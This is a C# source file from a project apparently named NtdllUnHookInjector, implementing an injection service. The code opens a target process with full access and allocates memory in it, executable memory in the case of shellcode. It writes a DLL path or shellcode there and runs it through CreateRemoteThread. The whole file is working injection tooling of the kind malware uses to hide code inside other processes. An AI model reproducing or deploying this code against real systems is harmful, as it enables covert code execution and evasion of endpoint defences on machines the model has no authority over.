using System;
using System.Runtime.InteropServices;
using Serilog;
using NtdllUnHookInjector.Core.Payloads;
using static NtdllUnHookInjector.Native.NativeMethods;
using static NtdllUnHookInjector.Native.NativeConstant;

namespace NtdllUnHookInjector.Core.Services
{
    public class InjectionService : IInjectionService
    {
        public void Inject(int processId, IInjectorPayload payload)
        {
            Log.Information($"Injecting {payload.GetPayloadDescription()} into process ID: {processId}...");

            // 1. Open the target process and obtain its handle
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
            if (hProcess == IntPtr.Zero)
            {
                Log.Error($"Failed: Unable to start process. Error code: {Marshal.GetLastWin32Error()}");
                return;
            }

            // 2. Get the address of the LoadLibraryA function
            IntPtr remoteFunctionAddress = payload.GetRemoteFunctionAddress();

            // 3. Allocate memory in the target process to store the DLL path
            byte[] payloadBytes = payload.GetPayloadBytes();
            IntPtr allocatedMemory;
            if (remoteFunctionAddress == IntPtr.Zero)
            {
                Log.Warning("Failed: Unable to get LoadLibraryW address.");
                Log.Warning("Trying to execute VirtualAllocEx using shellcode.");
                allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)payloadBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            }
            else
            {
                allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)payloadBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            }

            if (allocatedMemory == IntPtr.Zero)
            {
                Log.Error("Failed：Unable to allocate memory in the remote process.");
                CloseHandle(hProcess);
                return;
            }

            // 4. Write the DLL path to the target process's memory
            if (!WriteProcessMemory(hProcess, allocatedMemory, payloadBytes, (uint)payloadBytes.Length, out _))
            {
                Log.Error("Failed：Unable to write DLL path to remote process.");
                CloseHandle(hProcess);
                return;
            }

            // 5. Create a remote thread in the target process to call LoadLibraryA
            IntPtr remoteThread;
            if (remoteFunctionAddress == IntPtr.Zero)
            {
                Log.Warning("Failed: Unable to get LoadLibraryW address.");
                Log.Warning("Trying to execute CreateRemoteThread using shellcode.");
                remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out _);
            }
            else
            {
                remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteFunctionAddress, allocatedMemory, 0, out _);
            }
            //CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out _);
            if (remoteThread == IntPtr.Zero)
            {
                Log.Error($"Failed：Unable to establish remote thread. Error code:{Marshal.GetLastWin32Error()}");
                CloseHandle(hProcess);
                return;
            }

            WaitForSingleObject(remoteThread, 5000);
            // 6. Cleanup
            CloseHandle(remoteThread);
            CloseHandle(hProcess);
            Log.Information("DLL injection successful!");
        }
    }
}